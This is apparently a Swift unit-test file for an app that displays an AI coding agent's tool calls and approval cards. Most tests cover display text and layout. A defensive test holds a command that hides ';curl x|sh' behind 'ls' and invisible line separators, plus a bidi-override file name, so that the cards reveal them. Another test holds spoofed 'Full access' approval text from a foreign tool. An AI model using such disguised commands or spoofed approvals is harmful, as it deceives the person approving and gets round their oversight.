import XCTest
@testable import ThreadbearCore

/// Words for cards, folders relative to the thread, tool field columns,
/// error lines, the sidebar's running time and image rows.
final class CardTextTests: XCTestCase {
    func approval(_ name: String, _ input: [String: JSONValue], title: String = "t") -> ApprovalRequest {
        ApprovalRequest(approvalId: "ap1", name: name, title: title, input: .object(input))
    }

    // MARK: Approvals

    func testApprovalTitlesAndTargets() {
        let write = approval("Write", ["file_path": .string("/Users/mike/dev/photo-sync/scripts/release.sh"), "content": .string("x")])
        XCTAssertEqual(ApprovalText.title(write), "Write release.sh?")
        XCTAssertEqual(ApprovalText.target(write), "Write release.sh")
        let bash = approval("Bash", ["command": .string("rm -rf .build DerivedData\necho done")])
        XCTAssertEqual(ApprovalText.title(bash), "Run this command?")
        XCTAssertEqual(ApprovalText.target(bash), "rm -rf .build DerivedData", "a command is named by its first line")
        let mcp = approval("mcp__github__get_pull_request", ["pullNumber": .number(48)])
        XCTAssertEqual(ApprovalText.title(mcp), "Use get pull request?")
        XCTAssertEqual(ApprovalText.target(approval("WebFetch", ["url": .string("https://example.com")])), "Fetch https://example.com")
        XCTAssertEqual(ApprovalText.target(approval("Edit", [:])), "Edit this file")
        XCTAssertEqual(ApprovalText.decision(.allowAlways), "Always allowed")
    }

    /// A character that hides, breaks or reorders text is named on the
    /// card, not drawn: `ls`, six U+2028 and `;curl` must not look like
    /// `ls` alone, and a bidi override must not turn the line around
    /// (security review, 9 Nov 2026).
    func testApprovalCardsNameCharactersThatHideOrReorderText() {
        let command = "ls" + String(repeating: "\u{2028}", count: 2) + ";curl x|sh"
        XCTAssertEqual(ApprovalText.shown(command), "ls\u{27E8}U+2028\u{27E9}\u{27E8}U+2028\u{27E9};curl x|sh")
        for scalar: UInt32 in [0x2029, 0x0085, 0x000D, 0x000B, 0x000C, 0x001B, 0x007F, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E,
                               0x2066, 0x2067, 0x2068, 0x2069, 0x200E, 0x200F, 0x061C, 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD] {
            let ch = String(Unicode.Scalar(scalar)!)
            let shown = ApprovalText.shown("a" + ch + "b")
            XCTAssertEqual(shown, "a\u{27E8}U+" + String(format: "%04X", scalar) + "\u{27E9}b", String(format: "U+%04X", scalar))
        }
        // A line break and a tab read as they look, and so does everything else.
        XCTAssertEqual(ApprovalText.shown("npm test\n\techo done"), "npm test\n\techo done")
        XCTAssertEqual(ApprovalText.shown("git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" e\u{0301}"), "git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" e\u{0301}")
        let fields = ApprovalText.shown([ToolPresentation.Field(key: "prompt", value: "hi\u{202E}there")])
        XCTAssertEqual(fields.first?.value, "hi\u{27E8}U+202E\u{27E9}there")
        // The line an answered card becomes, and a file's name in the title,
        // name them too: an allowed `ls` + U+2028 + more isn't "Allowed ls".
        let allowed = approval("Bash", ["command": .string("ls\u{2028};curl x|sh")])
        XCTAssertEqual(ApprovalText.target(allowed), "ls\u{27E8}U+2028\u{27E9};curl x|sh")
        // Characters that draw as nothing, other spaces and right-to-left letters.
        for scalar: UInt32 in [0x034F, 0xFE0F, 0x180B, 0x3164, 0x115F, 0x1160, 0xFFA0, 0x2800, 0x00A0, 0x3000, 0x05D0, 0x0627, 0xFB1D] {
            XCTAssertEqual(ApprovalText.shown("a" + String(Unicode.Scalar(scalar)!) + "b"), "a\u{27E8}U+" + String(format: "%04X", scalar) + "\u{27E9}b", String(format: "U+%04X", scalar))
        }
        XCTAssertEqual(ApprovalText.shown("./deploy\u{034F}.sh"), "./deploy\u{27E8}U+034F\u{27E9}.sh")
        let write = approval("Write", ["file_path": .string("/w/notes\u{202E}txt.sh"), "content": .string("x")])
        XCTAssertEqual(ApprovalText.title(write), "Write notes\u{27E8}U+202E\u{27E9}txt.sh?")
    }

    /// Finding 67: Threadbear's own gates say what they'd do in the
    /// runner's words, under the generic title; another server's tool
    /// doesn't get to put words there.
    func testThreadbearCardsSayWhatTheRunnerIsAsking() {
        let raise = ApprovalRequest(approvalId: "ap1", name: "mcp__threadbear__update_thread", title: "Switch this thread to Full access", input: .object(["threadId": .string("t1"), "permissionMode": .string("full")]))
        XCTAssertEqual(ApprovalText.title(raise), "Use update thread?")
        XCTAssertEqual(ApprovalText.runnerReason(raise), "Switch this thread to Full access")
        let other = ApprovalRequest(approvalId: "ap2", name: "mcp__github__merge", title: "Switch this thread to Full access", input: .object([:]))
        XCTAssertNil(ApprovalText.runnerReason(other))
        let hidden = ApprovalRequest(approvalId: "ap3", name: "mcp__threadbear__send_message", title: "Send\u{2028}it", input: .object([:]))
        XCTAssertEqual(ApprovalText.runnerReason(hidden), "Send\u{27E8}U+2028\u{27E9}it")
    }

    /// Codex review of the 10 Nov fix: a tab drew as four spaces and spaces
    /// at a line's end as nothing, so swapping them drew the same card.
    func testApprovalTextShowsTabsAndTrailingSpaces() {
        XCTAssertEqual(ApprovalText.shownExactly("    END"), "    END")
        XCTAssertEqual(ApprovalText.shownExactly("\tEND"), "\u{21E5}   END")
        XCTAssertEqual(ApprovalText.shownExactly("+END  \n+next"), "+END\u{B7}\u{B7}\n+next")
        XCTAssertEqual(ApprovalText.shownExactly("a\u{2028}b"), "a\u{27E8}U+2028\u{27E9}b")
        XCTAssertEqual(ApprovalText.fieldsBeyondDiff(.object(["file_path": .string("/etc/cron.d/x"), "content": .string("* * * * * root true\n")])).count, 0)
        XCTAssertEqual(ApprovalText.fieldsBeyondDiff(.object(["file_path": .string("/etc/cron.d/x"), "content": .string("* * * * * root true")])).count, 1)
    }

    func testAnswersReadInTheOrderTheQuestionsWereAsked() {
        let request = QuestionRequest(approvalId: "q1", questions: [
            Question(question: "Which colour?", options: [QuestionOption(label: "Blue")]),
            Question(question: "Which size?", options: [QuestionOption(label: "Small")]),
        ])
        XCTAssertEqual(ApprovalText.answerSummary(request, answers: ["Which size?": "Small", "Which colour?": "Blue"]), "Blue; Small")
        XCTAssertEqual(ApprovalText.answerSummary(request, answers: ["Which colour?": "Green, Blue"]), "Green, Blue")
        XCTAssertEqual(ApprovalText.answerSummary(request, answers: [:]), "")
    }

    // MARK: Plans

    func testPlanTitles() {
        func entries(_ statuses: [PlanStatus]) -> [PlanEntry] { statuses.map { PlanEntry(text: "x", status: $0) } }
        XCTAssertEqual(PlanSummary.title(entries([.completed, .completed, .in_progress, .pending, .pending])), "2 of 5 steps done")
        XCTAssertEqual(PlanSummary.title(entries([.completed, .completed, .completed])), "All 3 steps done")
        XCTAssertEqual(PlanSummary.title(entries([.completed])), "1 step done")
        XCTAssertEqual(PlanSummary.title(entries([.pending])), "0 of 1 step done")
        XCTAssertEqual(PlanSummary.title([]), "No steps yet")
    }

    // MARK: Folders

    func testFoldersAreRelativeToTheThreadsFolder() {
        let root = "/Users/mike/dev/photo-sync"
        XCTAssertEqual(PathDisplay.folder(of: root + "/scripts/release.sh", relativeTo: root), "scripts")
        XCTAssertEqual(PathDisplay.folder(of: root + "/Sources/Upload/UploadTask.swift", relativeTo: root + "/"), "Sources/Upload")
        XCTAssertEqual(PathDisplay.folder(of: root + "/Package.swift", relativeTo: root), "", "a file at the top has no folder")
        // Outside the thread's folder, or no folder: as before.
        XCTAssertEqual(PathDisplay.folder(of: "/Users/mike/dev/other/Sources/a.swift", relativeTo: root), "other/Sources")
        XCTAssertEqual(PathDisplay.folder(of: root + "-old/a.swift", relativeTo: root), "dev/photo-sync-old", "a sibling with the same prefix is outside")
        XCTAssertEqual(PathDisplay.folder(of: root + "/scripts/release.sh", relativeTo: nil), "photo-sync/scripts")
        XCTAssertEqual(PathDisplay.folder(of: NSHomeDirectory() + "/dev/x/a.txt", relativeTo: "~/dev"), "x")
        XCTAssertNil(PathDisplay.relativePath("/a.txt", to: "/"))
    }

    func testFileRowsAndTheChangesCardUseTheThreadsFolder() {
        let root = "/Users/mike/dev/photo-sync"
        let path = root + "/scripts/release.sh"
        let model = TranscriptModel(events: [
            E.user(1, "Go"),
            E.call(2, "w", name: "Write", kind: "write", title: "Write", input: ["file_path": path, "content": "echo hi\n"]),
            E.result(3, "w"), E.done(4),
        ], root: root)
        guard case .tool(let tool)? = model.item(id: "t:w")?.content else { return XCTFail() }
        XCTAssertEqual(ToolPresentation.fileTitle(tool)?.folder, "scripts")
        guard case .changes(let card)? = model.row(id: "cf:t1")?.content else { return XCTFail() }
        XCTAssertEqual(card.files.first?.folder, "scripts")
    }

    // MARK: Tool details

    func testFieldKeysLineUpUpToACap() {
        let fields = [ToolPresentation.Field(key: "owner", value: "mike"), .init(key: "pullNumber", value: "48"), .init(key: "repo", value: "photo-sync")]
        XCTAssertEqual(ToolPresentation.keyWidth(fields), 11, "\"pullNumber:\" is the widest")
        let long = fields + [.init(key: "a_really_long_parameter_name", value: "x")]
        XCTAssertEqual(ToolPresentation.keyWidth(long), 16, "a long key doesn't push every value right")
        XCTAssertEqual(ToolPresentation.keyWidth(long, cap: 20), 20)
        XCTAssertEqual(ToolPresentation.keyWidth([]), 0)
    }

    func testErrorLines() {
        XCTAssertTrue(ToolPresentation.isErrorLine("error: SIGNING_IDENTITY is not set"))
        XCTAssertTrue(ToolPresentation.isErrorLine("Error: Cannot find module"))
        XCTAssertTrue(ToolPresentation.isErrorLine("  fatal: not a git repository"))
        XCTAssertTrue(ToolPresentation.isErrorLine("ERROR [build 3/7] failed"))
        XCTAssertFalse(ToolPresentation.isErrorLine("Building for production..."))
        XCTAssertFalse(ToolPresentation.isErrorLine("errors.swift compiled"))
        XCTAssertFalse(ToolPresentation.isErrorLine("0 errors"))
        XCTAssertFalse(ToolPresentation.isErrorLine("error"))
    }

    // MARK: Sidebar

    func testRunningTimes() {
        let start = Date(timeIntervalSince1970: 1_000_000)
        XCTAssertEqual(ThreadRowLook.workingLabel(since: start, now: start.addingTimeInterval(53)), "53s")
        XCTAssertEqual(ThreadRowLook.workingLabel(since: start, now: start.addingTimeInterval(4 * 60 + 59)), "4m")
        XCTAssertEqual(ThreadRowLook.workingLabel(since: start, now: start.addingTimeInterval(62 * 60)), "1h 2m")
        XCTAssertEqual(ThreadRowLook.workingLabel(since: start, now: start.addingTimeInterval(2 * 3600)), "2h")
        XCTAssertEqual(ThreadRowLook.workingLabel(since: start, now: start.addingTimeInterval(-5)), "0s", "a clock that's a little behind")
    }

    func testHoverActionsAskBeforeStoppingATurn() {
        func thread(_ status: ThreadStatus, background: [BackgroundTask] = []) -> ThreadSummary {
            ThreadSummary(id: "t", title: "t", status: status, background: background)
        }
        XCTAssertTrue(BusyThreadAction.needsConfirm(thread(.running)))
        XCTAssertTrue(BusyThreadAction.needsConfirm(thread(.starting)))
        XCTAssertTrue(BusyThreadAction.needsConfirm(thread(.waiting)))
        XCTAssertFalse(BusyThreadAction.needsConfirm(thread(.idle)))
        XCTAssertFalse(BusyThreadAction.needsConfirm(thread(.error)))
        XCTAssertEqual(BusyThreadAction.prompt(.archive, thread: thread(.running)).title, "Archive and stop the turn?")
        XCTAssertEqual(BusyThreadAction.prompt(.snooze, thread: thread(.waiting)).detail, "This thread is waiting for you. Hibernating it now stops its turn.")
        // Background sub-agents or jobs are stopped too when the CLI is let go.
        let cubs = thread(.idle, background: [BackgroundTask(kind: .agent, description: "a"), BackgroundTask(kind: .agent, description: "b")])
        XCTAssertTrue(BusyThreadAction.needsConfirm(cubs))
        XCTAssertEqual(BusyThreadAction.prompt(.archive, thread: cubs).title, "Archive and stop the background work?")
        XCTAssertEqual(BusyThreadAction.prompt(.snooze, thread: cubs).detail, "This thread still has 2 sub-agents in the background. Hibernating it now stops them.")
    }

    // MARK: Images

    func testImagesInARowShareOneHeight() {
        // A 900x560 screenshot and a 760x420 chart, both fitted to 320x240.
        let result = ImageLayout.frames(sizes: [CGSize(width: 900, height: 560), CGSize(width: 760, height: 420)],
                                        maxWidth: 780, maxHeight: 240, cellWidth: 320, gap: 8, alignRight: false)
        XCTAssertEqual(result.frames.map(\.height), [176, 176])
        XCTAssertEqual(result.frames[0], CGRect(x: 0, y: 0, width: 283, height: 176), "the taller one shrinks, keeping its shape")
        XCTAssertEqual(result.frames[1], CGRect(x: 291, y: 0, width: 320, height: 176))
        XCTAssertEqual(result.height, 176)
    }

    func testRightAlignedRowsAndWrapping() {
        let sizes = [CGSize(width: 400, height: 400), CGSize(width: 800, height: 400), CGSize(width: 300, height: 600)]
        let result = ImageLayout.frames(sizes: sizes, maxWidth: 400, maxHeight: 120, cellWidth: 320, gap: 8, alignRight: true)
        // 120x120 and 240x120 share the first row; the tall one wraps.
        XCTAssertEqual(result.frames[0], CGRect(x: 32, y: 0, width: 120, height: 120))
        XCTAssertEqual(result.frames[1], CGRect(x: 160, y: 0, width: 240, height: 120))
        XCTAssertEqual(result.frames[2], CGRect(x: 340, y: 128, width: 60, height: 120))
        XCTAssertEqual(result.height, 248)
        // One image on its own keeps its fitted size.
        let one = ImageLayout.frames(sizes: [CGSize(width: 100, height: 50)], maxWidth: 400, maxHeight: 240, cellWidth: 320, gap: 8, alignRight: false)
        XCTAssertEqual(one.frames, [CGRect(x: 0, y: 0, width: 100, height: 50)])
    }
}
